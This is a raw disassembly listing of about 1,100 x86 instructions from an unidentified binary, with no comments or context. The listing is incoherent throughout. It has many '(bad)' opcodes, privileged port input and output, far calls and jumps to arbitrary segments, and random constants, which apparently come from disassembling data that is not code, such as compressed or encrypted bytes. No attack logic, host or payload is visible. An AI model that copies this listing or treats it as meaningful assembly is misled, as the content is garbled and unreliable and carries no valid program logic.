  41c334:	repnz pop DWORD PTR [esi+0x2e]
  41c338:	pop    ecx
  41c339:	cli    
  41c33a:	push   ecx
  41c33b:	in     al,dx
  41c33c:	mov    eax,ds:0x3515daef
  41c341:	(bad)  
  41c342:	das    
  41c343:	and    al,0xa
  41c345:	gs shr edx,0x3
  41c349:	imul   ecx,DWORD PTR [esi],0xffffffdb
  41c34c:	mov    eax,0xdca5d1a9
  41c351:	imul   esi,edx,0xf215a8c6
  41c357:	pushf  
  41c358:	cwde   
  41c359:	and    DWORD PTR [edx*8+0x2f7ffe3e],edi
  41c360:	xor    DWORD PTR [ebx-0x35],edx
  41c363:	ja     0x41c3dc
  41c365:	dec    edx
  41c366:	sbb    eax,0x4a3cb9e7
  41c36b:	xor    DWORD PTR [ecx+edi*8+0x40869106],ecx
  41c372:	ins    DWORD PTR es:[edi],dx
  41c373:	test   BYTE PTR [eax+0x2c8e93cd],al
  41c379:	out    dx,al
  41c37a:	out    dx,eax
  41c37b:	ja     0x41c3e0
  41c37d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c37e:	cld    
  41c37f:	test   BYTE PTR [eax-0x773da050],bl
  41c385:	push   0xffffffd5
  41c387:	out    dx,eax
  41c388:	mov    eax,0xf3b13959
  41c38d:	push   ecx
  41c38e:	mov    esi,0xadb44143
  41c393:	ret    0x1fba
  41c396:	test   esp,0xcc7af2e8
  41c39c:	outs   dx,DWORD PTR ds:[esi]
  41c39d:	pop    eax
  41c39e:	dec    ebp
  41c39f:	in     al,0x62
  41c3a1:	addr16 loope 0x41c3fd
  41c3a4:	(bad)  
  41c3a5:	int    0x2f
  41c3a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3a8:	mov    ebp,0xfb40fda1
  41c3ad:	sub    ch,BYTE PTR [esi]
  41c3af:	es jb  0x41c3aa
  41c3b2:	or     eax,0x75edceac
  41c3b7:	ret    
  41c3b8:	adc    dl,BYTE PTR [edi-0x48]
  41c3bb:	fisub  DWORD PTR [edi-0x22b8cb6a]
  41c3c1:	out    dx,al
  41c3c2:	imul   ebp,DWORD PTR [edi-0x4ce85cda],0x15fee535
  41c3cc:	inc    eax
  41c3cd:	fcmovnbe st,st(7)
  41c3cf:	xlat   BYTE PTR ds:[ebx]
  41c3d0:	addr16 dec edi
  41c3d2:	les    ebp,FWORD PTR [ebx+0xf351644]
  41c3d8:	popa   
  41c3d9:	add    eax,0x8bcc9ad2
  41c3de:	sub    BYTE PTR [edx+0x62a0df4a],cl
  41c3e4:	fimul  WORD PTR [eax-0x1b]
  41c3e7:	jns    0x41c465
  41c3e9:	fdivr  DWORD PTR [edx-0x69]
  41c3ec:	lods   eax,DWORD PTR ds:[esi]
  41c3ed:	call   0x6c738a88
  41c3f2:	adc    DWORD PTR [edx],esp
  41c3f4:	call   0x7db9c41c
  41c3f9:	lock sub ebp,DWORD PTR [edi]
  41c3fc:	xor    edi,DWORD PTR [ebx+0x42]
  41c3ff:	mov    ch,0x5c
  41c401:	mov    ds:0x8ed579b1,al
  41c406:	or     eax,0xfe9b268a
  41c40b:	call   0xb294:0x8f16
  41c411:	add    esi,DWORD PTR [esi+0x39b30c9d]
  41c417:	bnd jne 0x41c3dd
  41c41a:	mov    ebx,0x1a18dcec
  41c41f:	call   0xa367:0x25d971e4
  41c426:	mov    BYTE PTR [ecx+0x3f],dl
  41c429:	stos   DWORD PTR es:[edi],eax
  41c42a:	test   eax,0x7349ae87
  41c42f:	stos   BYTE PTR es:[edi],al
  41c430:	dec    eax
  41c431:	in     al,0xa2
  41c433:	ficom  DWORD PTR [ebp+eax*4-0x3c9ab5a9]
  41c43a:	cwde   
  41c43b:	or     DWORD PTR [edx-0x6],0xb8dd7a3a
  41c442:	sub    al,0x77
  41c444:	or     al,0x22
  41c446:	pop    ecx
  41c447:	push   esi
  41c448:	les    esp,FWORD PTR [ebx]
  41c44a:	cmp    DWORD PTR [ecx],ecx
  41c44c:	jmp    0xc8049578
  41c451:	adc    al,0x80
  41c453:	call   0x7304:0x84f8513f
  41c45a:	xchg   ebp,eax
  41c45b:	cli    
  41c45c:	adc    edx,DWORD PTR [ebp+0x4277fbee]
  41c462:	push   ds
  41c463:	jg     0x41c411
  41c465:	xchg   ebp,eax
  41c466:	dec    edx
  41c467:	push   DWORD PTR [ebx+eax*4+0x68]
  41c46b:	xchg   ecx,eax
  41c46c:	xor    DWORD PTR [ebx+0x12],0x66
  41c470:	jg     0x41c4d7
  41c472:	push   ecx
  41c473:	(bad)  
  41c475:	or     al,0xdb
  41c477:	add    al,BYTE PTR [ecx+0x1fe8dbdd]
  41c47d:	and    BYTE PTR [ebx-0x1d],dl
  41c480:	push   edi
  41c481:	ds ss adc esi,ebx
  41c485:	(bad)  
  41c487:	xor    eax,0xa585b468
  41c48c:	int3   
  41c48d:	jecxz  0x41c421
  41c48f:	out    0xe5,al
  41c491:	jecxz  0x41c43d
  41c493:	sbb    dh,BYTE PTR [esi]
  41c495:	test   cl,bl
  41c497:	add    edi,edi
  41c499:	push   edx
  41c49a:	jp     0x41c465
  41c49c:	push   ss
  41c49d:	icebp  
  41c49e:	sbb    al,0x84
  41c4a0:	mov    DWORD PTR gs:[eax-0x399070bb],0x2b41d68b
  41c4ab:	outs   dx,BYTE PTR ds:[esi]
  41c4ac:	lods   al,BYTE PTR ds:[esi]
  41c4ad:	push   ecx
  41c4ae:	xchg   esp,eax
  41c4af:	gs out dx,eax
  41c4b1:	inc    ebp
  41c4b2:	pop    es
  41c4b3:	popf   
  41c4b4:	xchg   ebx,eax
  41c4b5:	lea    edi,[eax+0x3e]
  41c4b8:	mov    bh,0x6d
  41c4ba:	aad    0x2b
  41c4bc:	repz adc al,0xc8
  41c4bf:	add    DWORD PTR [esi-0x2a],ebp
  41c4c2:	fsub   st,st(4)
  41c4c4:	jns    0x41c4d6
  41c4c6:	mov    DWORD PTR [eax],edx
  41c4c8:	int3   
  41c4c9:	pop    edi
  41c4ca:	mov    edi,0x1e34dd8
  41c4cf:	pop    esp
  41c4d0:	cmp    al,0x3
  41c4d2:	lods   al,BYTE PTR ds:[esi]
  41c4d3:	sub    DWORD PTR [ecx+0x14],ecx
  41c4d6:	ins    DWORD PTR es:[edi],dx
  41c4d7:	cmp    eax,0xe5327f6f
  41c4dc:	iret   
  41c4dd:	jb     0x41c54d
  41c4df:	mov    bl,0x50
  41c4e1:	ja     0x41c525
  41c4e3:	aad    0x94
  41c4e5:	push   ss
  41c4e6:	out    0x2f,eax
  41c4e8:	dec    edi
  41c4e9:	inc    esp
  41c4ea:	out    dx,eax
  41c4eb:	ss out 0x37,al
  41c4ee:	mov    fs,esp
  41c4f0:	scas   al,BYTE PTR es:[edi]
  41c4f1:	inc    ecx
  41c4f2:	test   DWORD PTR [ebp-0x2c],ebx
  41c4f5:	xor    ecx,esp
  41c4f7:	retf   0xf977
  41c4fa:	push   ebp
  41c4fb:	inc    edi
  41c4fc:	sbb    ebp,eax
  41c4fe:	push   0x26
  41c500:	shr    ecx,1
  41c502:	scas   eax,DWORD PTR es:[edi]
  41c503:	scas   al,BYTE PTR es:[edi]
  41c504:	jl     0x41c4d9
  41c506:	fdecstp 
  41c508:	repz lahf 
  41c50a:	jbe    0x41c4b4
  41c50c:	lock ret 0xadc7
  41c510:	aad    0x34
  41c512:	icebp  
  41c513:	adc    eax,0xd40abf2e
  41c518:	cmp    eax,0xbfe9cbb8
  41c51d:	push   eax
  41c51e:	push   esp
  41c51f:	add    al,0xd8
  41c521:	xchg   ebp,eax
  41c522:	fs inc esi
  41c524:	xchg   BYTE PTR [esi],dl
  41c526:	mov    cl,0xe1
  41c528:	jp     0x41c53d
  41c52a:	inc    esi
  41c52b:	cdq    
  41c52c:	inc    ch
  41c52e:	mov    esi,0x17c44673
  41c533:	fsubrp st(1),st
  41c535:	add    DWORD PTR [esi-0x6f26c727],0xb39fc8f7
  41c53f:	sub    ch,0xb5
  41c542:	ss (bad) 
  41c544:	lea    ebx,[eax]
  41c546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c547:	cmp    DWORD PTR [eax-0xe377ebb],edi
  41c54d:	mov    bh,0x17
  41c54f:	mov    bl,0x42
  41c551:	cdq    
  41c552:	lods   eax,DWORD PTR ds:[esi]
  41c553:	cmp    bh,dh
  41c555:	das    
  41c556:	out    dx,al
  41c557:	cwde   
  41c558:	(bad)  
  41c55a:	dec    edi
  41c55b:	mov    ebp,0xb1755871
  41c560:	test   DWORD PTR [ebp-0xd],esp
  41c563:	pop    ss
  41c564:	clc    
  41c565:	mov    bl,0x4c
  41c567:	push   ebp
  41c568:	cmp    al,0xef
  41c56a:	and    ah,BYTE PTR [esi-0x5a]
  41c56d:	push   0x67
  41c56f:	inc    ebx
  41c570:	in     al,0xfc
  41c572:	fnstenv [ebx]
  41c574:	sti    
  41c575:	imul   esp,DWORD PTR [ecx+ebx*1],0x6b
  41c579:	clc    
  41c57a:	add    eax,0x9f59dead
  41c57f:	add    esp,DWORD PTR [edi-0x2f822bdf]
  41c585:	pop    ebx
  41c586:	sbb    BYTE PTR ss:[ebp+ecx*2+0x32],dh
  41c58b:	add    BYTE PTR [edx+0x6ab9bab3],bh
  41c591:	or     al,0x68
  41c593:	mov    ecx,0xe3e4ec98
  41c598:	fld    TBYTE PTR [ebx-0x4650804]
  41c59e:	inc    ebp
  41c59f:	loop   0x41c60b
  41c5a1:	jae    0x41c5c9
  41c5a3:	inc    edi
  41c5a4:	mov    esp,DWORD PTR [ecx]
  41c5a6:	and    DWORD PTR [ebx+0x5bf90fa7],edx
  41c5ac:	repz sbb dh,bh
  41c5af:	data16 jmp 0x41c5eb
  41c5b2:	fimul  DWORD PTR [eax]
  41c5b4:	adc    ah,dh
  41c5b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5b7:	pusha  
  41c5b8:	dec    ebx
  41c5b9:	mov    ebp,0xb3cc4e0b
  41c5be:	cmp    ah,BYTE PTR [edx]
  41c5c0:	add    esp,DWORD PTR [esp+ebp*1+0x6a]
  41c5c4:	clc    
  41c5c5:	add    al,0x13
  41c5c7:	ret    0xcb24
  41c5ca:	sub    DWORD PTR [edx-0x5cac57d6],0x1e
  41c5d1:	aad    0x54
  41c5d3:	push   0xffffff83
  41c5d5:	leave  
  41c5d6:	jmp    0x41c56f
  41c5d8:	inc    esi
  41c5d9:	jnp    0x41c630
  41c5db:	sbb    al,0x2f
  41c5dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5de:	mov    esp,0x7e7c954c
  41c5e3:	jae    0x41c5bc
  41c5e5:	mov    dl,BYTE PTR [edi]
  41c5e7:	lahf   
  41c5e8:	js     0x41c5a7
  41c5ea:	inc    ebx
  41c5eb:	push   cs
  41c5ec:	push   esp
  41c5ed:	mov    ds:0x29d605f0,al
  41c5f2:	shl    cl,1
  41c5f4:	int3   
  41c5f5:	xchg   ebp,eax
  41c5f6:	and    ebx,DWORD PTR [edx]
  41c5f8:	(bad)  
  41c5f9:	sahf   
  41c5fa:	call   0xe8e9a18b
  41c5ff:	xor    BYTE PTR [ecx+0x4377efe5],dh
  41c605:	inc    esp
  41c606:	mov    dl,0x7b
  41c608:	pop    ds
  41c609:	pop    ds
  41c60a:	das    
  41c60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c60c:	out    dx,al
  41c60d:	sbb    ah,dl
  41c60f:	jg     0x41c5ca
  41c611:	add    cl,BYTE PTR [ebx]
  41c613:	push   esi
  41c614:	inc    eax
  41c615:	icebp  
  41c616:	mov    esi,0xed5ffe28
  41c61b:	cld    
  41c61c:	jl     0x41c633
  41c61e:	test   al,0x19
  41c620:	sub    al,0xbe
  41c622:	add    eax,0x5d367ae9
  41c627:	es scas al,BYTE PTR es:[edi]
  41c629:	and    BYTE PTR [edx-0x8],0x28
  41c62d:	loopne 0x41c5ff
  41c62f:	mov    ds:0xc554703,eax
  41c634:	push   cs
  41c635:	mov    dl,0xe
  41c637:	jae    0x41c690
  41c639:	adc    eax,0xe369cf9b
  41c63e:	jnp    0x41c63b
  41c640:	pop    ss
  41c641:	mov    gs,WORD PTR [ebx]
  41c643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c645:	gs out 0x5e,al
  41c648:	adc    DWORD PTR [ebx],0x2c
  41c64b:	cdq    
  41c64c:	dec    edx
  41c64d:	shl    ebx,0x46
  41c650:	aaa    
  41c651:	das    
  41c652:	je     0x41c6c4
  41c654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c655:	enter  0x9b4f,0x67
  41c659:	and    edx,ecx
  41c65b:	push   esp
  41c65c:	imul   esi,DWORD PTR ds:[esi-0x258fee7b],0x2577fcfe
  41c667:	cmc    
  41c668:	sbb    BYTE PTR [ecx],0x46
  41c66b:	out    0xc0,al
  41c66d:	xor    ecx,DWORD PTR [edx+0x7e]
  41c670:	test   al,0xf5
  41c672:	fdivr  st,st(2)
  41c674:	xchg   bx,ax
  41c676:	jbe    0x41c69d
  41c678:	pop    ebp
  41c679:	(bad)  
  41c67a:	jmp    0x41c60c
  41c67c:	ins    BYTE PTR es:[edi],dx
  41c67d:	pushf  
  41c67e:	mov    ss,WORD PTR [edx+0x22646c05]
  41c684:	mov    WORD PTR [ebp-0x51],es
  41c687:	push   es
  41c688:	cld    
  41c689:	adc    eax,0xe87ed8e
  41c68e:	js     0x41c612
  41c690:	imul   esp,edi,0xe0ecef2a
  41c696:	repnz xor eax,DWORD PTR [eax]
	...
  41c86d:	add    BYTE PTR [eax],al
  41c86f:	add    BYTE PTR [eax+ebx*1-0x2923a928],bl
  41c876:	sahf   
  41c877:	fidivr DWORD PTR [esi-0x64]
  41c87a:	add    al,ah
  41c87c:	rol    BYTE PTR [ebx-0x15],0xa2
  41c880:	jmp    0x41c832
  41c882:	add    DWORD PTR [eax],eax
  41c884:	and    eax,0xed000007
  41c889:	ret    
  41c88a:	sti    
  41c88b:	and    BYTE PTR [ebx],al
  41c88d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c88e:	ins    DWORD PTR es:[edi],dx
  41c88f:	cmp    cl,dh
  41c891:	bound  eax,QWORD PTR [ebp+0x3a]
  41c894:	test   eax,0xb3c1de8e
  41c899:	mov    esi,0xf6cf4731
  41c89e:	(bad)  
  41c89f:	cld    
  41c8a0:	mov    ch,0xd9
  41c8a2:	cwde   
  41c8a3:	mov    ds:0xe37bef24,eax
  41c8a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8a9:	sbb    al,0x12
  41c8ab:	sbb    DWORD PTR [edx],esp
  41c8ad:	or     DWORD PTR [ebx],esp
  41c8af:	outs   dx,DWORD PTR ds:[esi]
  41c8b0:	mov    ecx,es
  41c8b2:	adc    edi,DWORD PTR [ebx-0x5efa8469]
  41c8b8:	sbb    bh,BYTE PTR [esi]
  41c8ba:	push   0xf7d126ac
  41c8bf:	mov    ds:0x26aa27b2,al
  41c8c4:	sbb    eax,0x3da70fd8
  41c8c9:	add    bl,BYTE PTR [edi]
  41c8cb:	iret   
  41c8cc:	xchg   ecx,eax
  41c8cd:	push   edx
  41c8ce:	sub    DWORD PTR [edx+0x9b56dfd],edi
  41c8d4:	sahf   
  41c8d5:	imul   esp,DWORD PTR [eax+0x12],0x9322c312
  41c8dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8de:	sbb    eax,DWORD PTR [edx+esi*4+0x29705acd]
  41c8e5:	fwait
  41c8e6:	imul   edx,DWORD PTR [ecx],0xffffffff
  41c8e9:	pop    esp
  41c8ea:	out    0xf6,al
  41c8ec:	mov    eax,0x91c66f3a
  41c8f1:	or     BYTE PTR es:[ecx],ch
  41c8f4:	sti    
  41c8f5:	imul   esp,DWORD PTR [ebx],0xa9e87597
  41c8fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8fc:	cmp    BYTE PTR [ecx-0x493e2bab],dh
  41c902:	sar    BYTE PTR [eax],1
  41c904:	in     al,dx
  41c905:	cmp    bh,BYTE PTR [esi-0x41]
  41c908:	mov    dl,BYTE PTR [esi+0x6a4df1e9]
  41c90e:	ret    0xa73b
  41c911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c912:	je     0x41c901
  41c914:	push   esp
  41c915:	or     al,0xac
  41c917:	and    eax,0x59d65d5d
  41c91c:	sub    bl,BYTE PTR [esi]
  41c91e:	mov    bh,0x7f
  41c920:	dec    ebx
  41c921:	mov    cl,0x29
  41c923:	fcmovnbe st,st(2)
  41c925:	sub    BYTE PTR [ebp+eiz*1+0x5d],bh
  41c929:	outs   dx,DWORD PTR ds:[esi]
  41c92a:	stos   BYTE PTR es:[edi],al
  41c92b:	add    BYTE PTR [eax+ebp*2],dh
  41c92e:	sbb    eax,0x612cae1c
  41c933:	ins    DWORD PTR es:[edi],dx
  41c934:	retf   0xdecd
  41c937:	push   cs
  41c938:	loope  0x41c931
  41c93a:	mov    esp,0xf65fc3bd
  41c93f:	test   BYTE PTR [ebx+eiz*8-0x6544c814],ch
  41c946:	(bad)  
  41c947:	xor    ecx,DWORD PTR [ecx]
  41c949:	jg     0x41c993
  41c94b:	mov    al,es:0x97703ac8
  41c951:	adc    BYTE PTR [edi],bl
  41c953:	fmul   st(0),st
  41c955:	mov    edx,0x82e95177
  41c95a:	lock aas 
  41c95c:	lahf   
  41c95d:	push   0xffffffa9
  41c95f:	mov    ecx,0x8c94f779
  41c964:	test   DWORD PTR es:[edx-0x42d3326e],ebx
  41c96b:	push   ebx
  41c96c:	push   eax
  41c96d:	iret   
  41c96e:	sbb    BYTE PTR ds:0x76d61381,bh
  41c974:	jle    0x41c9a1
  41c976:	push   edi
  41c978:	aad    0x74
  41c97a:	push   ds
  41c97b:	jnp    0x41c9dd
  41c97d:	lock mov ebx,0xc2f197c7
  41c983:	and    DWORD PTR [edi-0x30],0x39
  41c987:	call   0x10e81f6c
  41c98c:	addr16 sub al,0xd7
  41c98f:	xlat   BYTE PTR ds:[ebx]
  41c990:	fst    DWORD PTR [edx]
  41c992:	ret    0xcba6
  41c995:	pop    eax
  41c996:	pop    es
  41c997:	add    al,0xae
  41c999:	add    ebp,ebx
  41c99b:	push   ebp
  41c99c:	adc    al,0xa4
  41c99e:	cmp    eax,eax
  41c9a0:	rol    BYTE PTR [edx],1
  41c9a2:	imul   eax,DWORD PTR [esi+0x6c],0xffffffdf
  41c9a6:	xchg   ecx,eax
  41c9a7:	mov    bh,0x56
  41c9a9:	and    bl,BYTE PTR [edx+0x4d]
  41c9ac:	out    0xbc,al
  41c9ae:	sti    
  41c9af:	out    dx,eax
  41c9b0:	pop    eax
  41c9b1:	dec    edx
  41c9b2:	mov    bl,0x70
  41c9b4:	sbb    DWORD PTR [ebp-0x70],ecx
  41c9b7:	xchg   DWORD PTR [ecx+0x1343f8a],esp
  41c9bd:	popw   ds
  41c9bf:	push   edi
  41c9c0:	push   0xffffffe3
  41c9c2:	clc    
  41c9c3:	loope  0x41ca33
  41c9c5:	pop    esp
  41c9c6:	mov    ds:0x2ab30033,eax
  41c9cb:	sub    al,dl
  41c9cd:	jl     0x41ca36
  41c9cf:	jnp    0x41c9b1
  41c9d1:	ins    DWORD PTR es:[edi],dx
  41c9d2:	jo     0x41c998
  41c9d4:	call   0x3549:0xbd824ce4
  41c9db:	jmp    0xd6a8:0xb46baef0
  41c9e2:	xor    DWORD PTR [edx+0x6a637bd2],eax
  41c9e8:	push   0xe53294a5
  41c9ed:	inc    esp
  41c9ee:	xor    eax,0x5378b481
  41c9f3:	clc    
  41c9f4:	add    eax,0xfe283dd2
  41c9f9:	(bad)  
  41c9fa:	xlat   BYTE PTR ds:[ebx]
  41c9fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9fc:	mov    ds:0xfdf4cc82,eax
  41ca01:	sub    eax,0x2dbc937
  41ca06:	mov    eax,0xc08ed039
  41ca0b:	mov    ecx,DWORD PTR [eax-0x38]
  41ca0e:	or     ah,bl
  41ca10:	ret    0x4be
  41ca13:	jecxz  0x41ca56
  41ca15:	call   0x452d:0xf8569153
  41ca1c:	out    dx,eax
  41ca1d:	sbb    BYTE PTR [edx+0x7cabd245],ah
  41ca23:	int    0x99
  41ca25:	repnz enter 0x2ab3,0xd1
  41ca2a:	(bad)  
  41ca2b:	out    dx,eax
  41ca2c:	cs xor eax,0x22379c55
  41ca32:	mov    edi,0x9c5cc860
  41ca37:	out    dx,eax
  41ca38:	mov    ecx,0x9b004f31
  41ca3d:	fistp  WORD PTR [eax]
  41ca3f:	ins    DWORD PTR es:[edi],dx
  41ca40:	into   
  41ca41:	mov    al,ds:0x9f2cc2d
  41ca46:	test   DWORD PTR [eax],eax
  41ca48:	(bad)  
  41ca49:	nop
  41ca4a:	cdq    
  41ca4b:	out    0xee,eax
  41ca4d:	sar    BYTE PTR [eax],cl
  41ca4f:	out    dx,al
  41ca50:	adc    ebp,DWORD PTR [ebx+0x6eaae88c]
  41ca56:	xchg   ecx,eax
  41ca57:	sti    
  41ca58:	pusha  
  41ca59:	out    dx,al
  41ca5a:	out    0x2,eax
  41ca5c:	es jge 0x41c9f5
  41ca5f:	call   0xd149:0xcd52fb69
  41ca66:	jmp    0x6823:0x2dcb7265
  41ca6d:	bound  ecx,QWORD PTR [ecx-0x42]
  41ca70:	push   esi
  41ca71:	jle    0x41ca7f
  41ca73:	and    DWORD PTR [edx-0x1ecb71fd],eax
  41ca79:	sbb    al,BYTE PTR [edx-0x60]
  41ca7c:	xchg   ebp,eax
  41ca7d:	cmp    eax,0x354f896a
  41ca82:	sub    edi,DWORD PTR ds:0xd6bcb823
  41ca88:	xor    DWORD PTR [ebp+ebp*1+0x1aaa4f90],ebx
  41ca8f:	dec    esp
  41ca90:	aad    0x39
  41ca92:	sub    al,ch
  41ca94:	call   0x3290:0x728121ad
  41ca9b:	mov    WORD PTR [bp+di-0x4a],gs
  41ca9f:	fld    DWORD PTR [ecx+0x50]
  41caa2:	mov    al,0x49
  41caa4:	jno    0x41cb0d
  41caa6:	fucomip st,st(1)
  41caa8:	xchg   ecx,eax
  41caa9:	sbb    BYTE PTR [edx],bl
  41caab:	ret    
  41caac:	dec    edi
  41caad:	leave  
  41caae:	std    
  41caaf:	mov    ds:0x94880255,al
  41cab4:	add    eax,DWORD PTR [ebx+0x2]
  41cab7:	mov    dl,0x20
  41cab9:	sbb    DWORD PTR [ebp-0x44],ebx
  41cabc:	and    al,0x90
  41cabe:	jnp    0x41ca5b
  41cac0:	aam    0xef
  41cac2:	or     al,0x5e
  41cac4:	cmp    DWORD PTR [esi-0x3],0x1b
  41cac8:	pop    ecx
  41cac9:	inc    eax
  41caca:	push   eax
  41cacb:	mov    ch,0xc
  41cacd:	jns    0x41caab
  41cacf:	pop    edi
  41cad0:	push   edx
  41cad1:	xchg   esi,eax
  41cad2:	jg     0x41cadc
  41cad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cad6:	xchg   ebp,eax
  41cad7:	data16 aas 
  41cad9:	loop   0x41cafa
  41cadb:	bound  ecx,QWORD PTR ds:[esi+eax*8-0x61]
  41cae0:	push   esp
  41cae1:	in     eax,0xf3
  41cae3:	jb     0x41cb2a
  41cae5:	(bad)  
  41cae6:	sub    bl,cl
  41cae8:	lods   al,BYTE PTR ds:[esi]
  41cae9:	cs sahf 
  41caeb:	and    eax,0xe3eded89
  41caf0:	dec    dx
  41caf2:	outs   dx,DWORD PTR ds:[esi]
  41caf3:	inc    edi
  41caf4:	mov    al,ds:0x1699cf01
  41caf9:	dec    edx
  41cafa:	pop    es
  41cafb:	out    0x7a,eax
  41cafd:	ret    
  41cafe:	xchg   esi,eax
  41caff:	mov    ds:0xbae39822,al
  41cb04:	mov    ebx,0x1e8df3ec
  41cb09:	pop    es
  41cb0a:	neg    DWORD PTR [ecx]
  41cb0c:	pop    ebx
  41cb0d:	mov    bl,0x84
  41cb0f:	in     eax,dx
  41cb10:	inc    eax
  41cb11:	inc    esi
  41cb12:	jl     0x41cae2
  41cb14:	ret    0xaf6
  41cb17:	std    
  41cb18:	inc    esi
  41cb19:	int    0xd9
  41cb1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb1c:	mov    ebx,0xb60cc519
  41cb21:	lds    eax,FWORD PTR [ebp+esi*4-0x61]
  41cb25:	(bad)  
  41cb26:	sbb    esp,esi
  41cb28:	arpl   WORD PTR [ebp-0x2e511e47],bp
  41cb2e:	imul   eax,edx,0xffffffd8
  41cb31:	lods   al,BYTE PTR ds:[esi]
  41cb32:	push   ss
  41cb33:	and    bh,dl
  41cb35:	push   esi
  41cb36:	js     0x41cb12
  41cb38:	out    dx,eax
  41cb39:	loop   0x41cbab
  41cb3b:	sbb    ebp,DWORD PTR [ebp-0x2b]
  41cb3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb3f:	jne    0x41cbbe
  41cb41:	xchg   cl,dl
  41cb43:	xchg   BYTE PTR [esi+0x645da3de],dl
  41cb49:	pop    edx
  41cb4a:	das    
  41cb4b:	mov    edi,0x19050b28
  41cb50:	jnp    0x41cbba
  41cb52:	jnp    0x41cb5f
  41cb54:	pop    eax
  41cb55:	lea    ebp,[ebx]
  41cb57:	out    dx,eax
  41cb58:	sbb    ah,BYTE PTR [ecx+0xc4675c6]
  41cb5e:	dec    ecx
  41cb5f:	jae    0x41cbaf
  41cb61:	lock in eax,dx
  41cb63:	std    
  41cb64:	add    BYTE PTR [ebx],ch
  41cb66:	test   BYTE PTR [ebp-0x138e2748],0xad
  41cb6d:	xchg   esp,eax
  41cb6e:	pop    es
  41cb6f:	add    eax,DWORD PTR [ebp+0x29]
  41cb72:	(bad)  [ebp-0x296614f3]
  41cb78:	into   
  41cb79:	fbld   TBYTE PTR [esi+0x71]
  41cb7c:	or     al,0x74
  41cb7e:	loopne 0x41cb5b
  41cb80:	add    eax,DWORD PTR [ecx+0x7a]
  41cb83:	xor    BYTE PTR [eax-0x7a],bl
  41cb86:	out    0xde,al
  41cb88:	inc    edi
  41cb89:	retf   
  41cb8a:	ja     0x41cb98
  41cb8c:	lods   eax,DWORD PTR ds:[esi]
  41cb8d:	sbb    DWORD PTR [edi-0x57],edi
  41cb90:	das    
  41cb91:	test   eax,0x9b9612e6
  41cb96:	mov    al,ds:0x3714d4e5
  41cb9b:	dec    edx
  41cb9c:	sahf   
  41cb9d:	dec    eax
  41cb9e:	ja     0x41cc0d
  41cba0:	(bad)  
  41cba1:	jmp    0x5333:0x55413a6a
  41cba8:	mov    cl,0x82
  41cbaa:	jmp    0x4e52:0x93e8669a
  41cbb1:	stc    
  41cbb2:	shr    BYTE PTR [edi+0x16],1
  41cbb5:	cmp    edx,esi
  41cbb7:	cmp    cl,ah
  41cbb9:	push   0xffffff96
  41cbbb:	ret    0x5913
  41cbbe:	sbb    BYTE PTR [esi+0x5632b370],ah
  41cbc4:	in     al,dx
  41cbc5:	inc    eax
  41cbc6:	inc    esp
  41cbc7:	ins    BYTE PTR es:[edi],dx
  41cbc8:	xchg   esi,eax
  41cbc9:	in     eax,dx
  41cbca:	cmp    al,0x3d
  41cbcc:	imul   ebp,DWORD PTR ds:0xfe301adb,0x1e
  41cbd3:	jle    0x41cc0d
  41cbd5:	mov    al,ds:0xe83705e9
  41cbda:	push   cs
  41cbdb:	test   eax,0xef1fceae
  41cbe0:	nop
  41cbe1:	adc    eax,ecx
  41cbe3:	sub    al,0x9d
  41cbe5:	pop    ebx
  41cbe7:	dec    ecx
  41cbe8:	daa    
  41cbe9:	cld    
  41cbea:	daa    
  41cbeb:	mov    ch,0xa4
  41cbed:	jle    0x41cbfd
  41cbef:	repnz iret 
  41cbf1:	xor    eax,DWORD PTR [ebx+0x3394bd66]
  41cbf7:	mov    eax,ds:0xc629dd78
  41cbfc:	vpcmpeqb xmm6,xmm4,XMMWORD PTR [ebp-0x69]
  41cc01:	mov    ch,0xba
  41cc03:	xor    DWORD PTR [ebx],edi
  41cc05:	(bad)  
  41cc06:	(bad)
  41cc0a:	ins    BYTE PTR es:[edi],dx
  41cc0b:	mov    ds:0x87dc90f7,eax
  41cc10:	in     al,dx
  41cc11:	(bad)  
  41cc13:	(bad)  
  41cc14:	pop    edi
  41cc15:	idiv   DWORD PTR [ecx-0x6a]
  41cc18:	nop
  41cc19:	lods   al,BYTE PTR ds:[esi]
  41cc1a:	inc    ecx
  41cc1b:	daa    
  41cc1c:	adc    eax,esi
  41cc1e:	in     al,0xd5
  41cc20:	pushf  
  41cc21:	cmp    eax,0xfc5b96a9
  41cc26:	cwde   
  41cc27:	sbb    DWORD PTR [ebx],esp
  41cc29:	(bad)  
  41cc2a:	std    
  41cc2b:	arpl   WORD PTR [ebp+ebx*8-0x76],si
  41cc2f:	mov    ecx,0x58f72db0
  41cc34:	ins    DWORD PTR es:[edi],dx
  41cc35:	iret   
  41cc36:	xor    al,0xce
  41cc38:	lea    ecx,[esi+0x43084a67]
  41cc3e:	pop    edi
  41cc3f:	or     al,BYTE PTR [ebp+0x1620d151]
  41cc45:	ror    BYTE PTR [eax-0x60],1
  41cc48:	mov    dl,0xc3
  41cc4a:	lock imul edx,esi,0xa810a4e9
  41cc51:	pop    ebx
  41cc52:	mov    esi,0xbb2ffa23
  41cc57:	inc    ebx
  41cc58:	andps  xmm3,XMMWORD PTR [esi]
  41cc5b:	mov    edi,0x8e9f7a51
  41cc60:	inc    eax
